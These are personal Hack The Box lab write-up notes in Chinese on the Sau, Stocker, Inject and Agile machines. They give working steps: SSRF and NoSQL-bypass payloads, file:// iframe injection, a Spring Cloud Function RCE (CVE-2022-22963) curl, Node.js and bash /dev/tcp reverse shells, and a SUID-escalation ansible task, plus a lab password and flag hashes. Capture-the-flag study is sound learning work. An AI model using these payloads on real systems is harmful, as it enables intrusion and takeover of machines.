# HTB

[toc]
## StartPoint
### Archetype


## Easy
### Sau
#### user

nmap:
![image](https://i.imgur.com/UMFB7tm.png)

先访问55555这个端口
跟个webhook一样的东西`request basket`
可以找到`CVE-2023-27163`存在ssrf
#ssrf
[doc](https://notes.sjtu.edu.cn/s/MUUhEymt7)
```shell
 curl --location 'http://10.10.11.224:55555/api/baskets/mahesh' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

通过这个我们可以访问靶机的80端口
发现是`Maltrail (v0.53)`,在登录处存在命令注入
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722000626.png)

#### root
`sudo -l`查看权限
![image](https://i.imgur.com/gnBjgR6.png)

在`GTOBins`上可以systemctl看到提权
执行后类似于`less`命令,可以使用`!sh`提权

1. `script /dev/null /bin/bash`
> script /dev/null /bin/bash 命令的作用是启动一个新的 Bash 会话，并将所有的输出和输入重定向到 /dev/null 设备。这个命令通常用于在不产生任何输出的情况下启动一个新的 Bash shell。


2. `sudo /usr/bin/systemctl status trail.service`
3. `!sh`
![image](https://i.imgur.com/rJx8uZg.png)
### Stocker

#### user

nmap:

![image-20230320162937220](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320162937220.png)

80：

爆破子域名 `dev`

修改hosts，并且访问，发现是一个登录框

`noSQL` 绕过

```
Basic authentication bypass

Using not equal ($ne) or greater ($gt)

in URL

username[$ne]=toto&password[$ne]=toto

username[$regex]=.*&password[$regex]=.*

username[$exists]=true&password[$exists]=true



in JSON

{"username": {"$ne": null}, "password": {"$ne": null} }

{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }

{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

成功绕过登录
发现可以购物，随便购买后发现存在生成的 `购物清单`

```url
http://dev.stocker.htb/api/po/返回的uuid
```

生成的pdf里会有我们传过去的参数，修改 `title`参数为 

```html
<iframe src=file:///etc/passwd height=800px weight=1200px ></iframe>
```

即可在生成的pdf看到生成的文件，存在一个任意文件读取

因为是nginx服务器，读取配置文件

```
/etc/nginx/nginx.conf
```

发现根目录为

```
/var/www/dev
```

nodejs主文件

```
{app|index|main}.js
```

测试可以读到 `index.js`

泄露了 dev用户信息 ,但是由于passwd里不存在dev用户,改用另一个 `angoose`成功登录

* user 33fbd350c4b54660da6d5e2526765848

#### root

`sudo -l`

![image-20230320210055306](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320210055306.png)

我们可以执行 `node`目录的限定可以以穿梭绕过

生成一个nodejs反弹shell

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.16.15", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

* 没有任何模块所以无法使用 `child_process`

 成功拿到ROOT

* root 694c4e17c18faa76abf6f117765018e3

### Inject

#### user

nmap:



![image-20230318191333798](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230318191333798.png)

22：弱口令

8080：web服务，也就是从这里开始渗透

访问后发现只有上传一个功能点，随便上传一个图片，在viewimg功能下发现存在任意文件读取

```url
http://10http://10.10.11.204:8080/show_image?img=../../../../../../../
```

但是由于不知道功能点，没法读取，看了一眼wp

```
/show_image?img=../../../../../../../etc/systemd/system/webapp.service
```

* 在这里读取配置文件 
* 呆住了，读取目录会返回目录下的文件夹和文件 

reply

这是一个maven项目，目录结构

> 下一节记录 Maven 期望的目录布局和 Maven 创建的目录布局。尽量符合这个结构。但是，如果不能，可以通过项目描述符覆盖这些设置。
>
> | `src/main/java`      | 应用程序/库源                |
> | -------------------- | ---------------------------- |
> | `src/main/resources` | 应用/图书馆资源              |
> | `src/main/filters`   | 资源过滤文件                 |
> | `src/main/webapp`    | Web 应用程序源               |
> | `src/test/java`      | 测试源                       |
> | `src/test/resources` | 测试资源                     |
> | `src/test/filters`   | 测试资源过滤文件             |
> | `src/it`             | 集成测试（主要用于插件）     |
> | `src/assembly`       | 程序集描述符                 |
> | `src/site`           | 地点                         |
> | `LICENSE.txt`        | 项目许可证                   |
> | `NOTICE.txt`         | 项目依赖的库需要的声明和属性 |
> | `README.txt`         | 项目的自述文件               |
>
> 在顶层，描述项目的文件：文件`pom.xml`。此外，还有一些文本文档可供用户在收到源代码后立即阅读：`README.txt`、`LICENSE.txt`等。
>
> 这个结构只有两个子目录：`src`和`target`。此处预期的唯一其他目录是元数据，如`CVS`、`.git`或`.svn`，以及多项目构建中的任何子项目（每个子项目都将按上述方式布局）。
>
> 该`target`目录用于存放构建的所有输出。
>
> 该`src`目录包含用于构建项目、项目站点等的所有源材料。它包含每种类型的子目录：`main`主要构建工件、`test`单元测试代码和资源`site`等。
>
> 在工件生成源目录（即`main`和`test`）中，有一个目录用于语言`java`（在其下存在正常的包层次结构），另一个用于`resources`（在给定默认资源定义的情况下复制到目标类路径的结构）。
>
> 如果有其他对工件构建有贡献的来源，它们将位于其他子目录下。例如`src/main/antlr`将包含 Antlr 语法定义文件。



* ```
  [Unit]
  Description=Spring WEb APP
  After=syslog.target
  
  [Service]
  User=frank
  Group=frank
  ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
  Restart=always
  StandardOutput=syslog
  StandardError=syslog
  
  [Install]
  WantedBy=multi-user.target
  
  ```

所以下一步就是下载这个jar文件，审计网站源码

byd下载真慢

下载中断了，事实上并不需要下载

> maven 项目的一个重要部分是 pom.xml 文件，用于定义项目的所有特征和编译、打包和部署项目所需的依赖项

下载 `WebApp` 下的pom.xml文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
    	
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>com.sun.activation</groupId>
                        <artifactId>javax.activation</artifactId>
                        <version>1.2.0</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>

                <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>bootstrap</artifactId>
                        <version>5.1.3</version>
                </dependency>
                <dependency>
                        <groupId>org.webjars</groupId>
                        <artifactId>webjars-locator-core</artifactId>
                </dependency>

        </dependencies>
        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                                <version>${parent.version}</version>
                        </plugin>
                </plugins>
                <finalName>spring-webapp</finalName>
        </build>

</project>
```

可以发现使用了3.2.2版本的springframework.boot

存在 相关 [CVE-2022-22963](https://kalilinuxtutorials.com/cve-2022-22963/) 漏洞

> ###### 恶意 Spring Expression 在 Spring Cloud Function 中远程执行代码

poc

```shell
 curl -X POST  http://$IP:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget $YOUR_IP -O /tmp/shell.sh ")' --data-raw 'data' -vva
```

在我们kali `/tmp` 下新建一个 `shell.sh`文件,并且 `python -m http.server 80` 开启http,让靶机访问并下载shell,本地监听端口

* shell.sh

* ```shell
  bash -i >& /dev/tcp/10.10.11.46/4444 0>&1
  ```

再让靶机执行shell.sh

```shell
 curl -X POST  http://$IP:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")' --data-raw 'data' -vva
```

本地接收到 `frank ` 的shell

第一步,横向到`/home` 的phil用户

```shell
cd ~
//查看当前目录下所有文件和子文件
find .
cat ./.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

成功得到 `phil`的密码 DocPhillovestoInject123

* user 04193d0e310fefcea681b1047fb507f5

#### root

跟着wp迷迷糊糊拿到了

```shell
id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
//查看组可访问的特殊权限
find / -group staff 2>/dev/null
...
/opt/automation/tasks
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
...
```

> 使用 pspy 我发现了一个似乎每 3 分钟运行一次的 cronjob，并在目录**/opt/automation/tasks上执行ansible-parallel**

> Ansible Parallel 用于同时运行多个剧本。所以我猜 cronjob 正在做类似的事情
>
> ```shell
> /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/*
> ```

nnd这怎么发现的?? 整个pspy先

也就是说这个脚本每隔一段时间会运行 `/opt/automation/tasks/*`下的yml文件,只要我们新建一个

`shell.yml`文件

```shell
echo '[{hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]}]' >> /opt/automation/tasks/shell.yml
```

等几分钟后就 运行 `bash -p`就会成为root

* root 6b90bf771b3bca6f236cef43ae88773d

## Medium
### Sandworm
#### user
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722155953.png)

443: flask
`/login`存在登录框,secret_key爆破失败,
`/contact`与`/gudie`路由存在一个发送消息的地方,采用pgp加密技术,存在ssti

### OnlyForYou

#### user

![image-20230426235837003](https://gitee.com/leiye87/typora_picture/raw/master/20230426235840.png)



### Agile

* nmap
![image-20230320142510445](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230320142510445.png)

```shell
echo 10.10.11.203 superpass.htb >> /etc/hosts
```

访问80端口，是一个 密码管理网站，登陆后存在导出csv文件功能

url `perpass.htb/download?fn=../../../../../../../etc//proc/self/cgroup`存在任意文件下载

使用 `flask` 开启了 debug模式，应该是计算 `PIN` 后弹shell，

迷惑时刻，算pin算不对？？

下次再战

### Escape

第一次打window的靶机，多看多学习

nmap 常规1000个端口无结果。。
